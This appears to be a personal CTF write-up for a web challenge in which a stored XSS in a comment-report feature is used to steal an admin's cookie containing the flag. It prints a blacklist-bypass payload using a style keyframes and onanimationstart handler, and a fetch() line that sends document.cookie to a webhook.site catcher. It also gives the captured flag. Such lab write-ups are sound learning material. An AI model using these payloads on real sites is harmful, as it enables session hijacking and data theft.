---
tags:
  - 🚩
up:
  - "[[02 - (incomplete) Data Exfiltration]]"
platform: HackTheBox
difficulty: Easy
creation_date: 2026-02-08
last_modified: 2026-02-08
---

# 🚩 [[BKSEC - Report the violation]]
**Primary:** [[01 - Web Security]]

**Secondary:** [[02 - (incomplete) Data Exfiltration]]

**Related Techniques:** [[(incomplete) Cross-site Scripting|XSS]]

## Executive Summary
* **URL:** `http://103.77.175.40:8051/`
* **Key Technique:** Cross-site Scripting into cookies exfiltration
* **Status:** `Completed`

---

## Reconnaissance
### Gobuster Enumeration
I tried running `Gobuster` against the URL:
```bash

````

### Website Recon
I tried look the around the website will running `Gobuster` in the background. It seems like I can only work with the home page and nothing else. Testing other buttons on the navigation bar did not do anything. At the end of the page there is a comment feature. When I tried adding  a comment, there is a new comment was displayed in the page with a `Report` button attached to it.

![[Pasted image 20260208115207.png]]

---

## Cross-site Scripting

This looks oddly similar to some of the challenge I've met so from experience I suspect there might be an **XSS** vulnerability.

I tested the theory by trying the payload: `<script>alert(1)</script>`

![[Pasted image 20260208115651.png]]

The message is blocked from displaying. I posted another payload and intercept the request in `BurpSuite`

![[Pasted image 20260208115912.png]]

Two things I found that were critical:
* Flag was included as part of the cookies.
* The Website blacklisted forbidden HTML tags.

This confirmed that the vulnerability was indeed XSS and I needed to somehow inject my script into the page and make the admin sees it by sending it through the comment report function and make him reveal the cookie (aka. the flag).

Blacklisting is never a good idea since it can sometimes be fooled through obfuscation or if the blacklist is not thorough there will be a way to bypass. I copied the list of blacklisted tags and send it to Gemini for it to help me identify injectable tags: `<h1>` to `<h6>` and `<style>`.

The tools also help me generate the test payload:
```html
<style>@keyframes x{}</style>
<h1 style="animation-name:x" onanimationstart="alert(1)"></h1>
```

![[Pasted image 20260208121153.png]]

The payload worked so all I had to do left is setup a webhook using `webhook.site` and forge a new payload that is fetching the webhook using cookies as parameters.
```html
<style>@keyframes x{}</style>
<h1 style="animation-name:x" onanimationstart="fetch('?c='+document.cookie)"></h1>
```

After sending the report to the admin, observe the webhook's incoming requests gave me this:

![[Pasted image 20260208122024.png]]

---

## Loot & Flags

**Flag:** `BKSEC{y0ur_r3p0rt_h4s_b33n_r3v13w3d_by_th3_4dm1n_h3h3h3_7c9f2a}`

---

**References:** [Link](https://www.google.com/search?q=url)